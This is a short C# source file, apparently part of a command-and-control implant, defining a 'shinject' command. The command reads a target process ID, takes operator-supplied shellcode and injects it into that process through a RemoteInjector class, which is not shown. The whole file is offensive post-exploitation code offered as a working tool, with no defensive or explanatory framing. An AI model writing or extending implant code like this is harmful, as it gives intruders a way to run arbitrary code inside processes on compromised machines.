﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Agent.Internal;
using Agent.Models;

namespace Agent.Commands
{
    public class ShellcodeInject : AgentCommand
    {
        public override string Name => "shinject";
        public override string Execute(AgentTask task)
        {

            if (!int.TryParse(task.Arguments[0], out var pid))
                return "Failed to parse pid";
            var injector = new RemoteInjector();
            var shellcode = task.FileBytes;
            var res = injector.Inject(shellcode, pid);
            if (res)
                return "Injected successfully";
            return "Failed to inject";
        }
    }
}
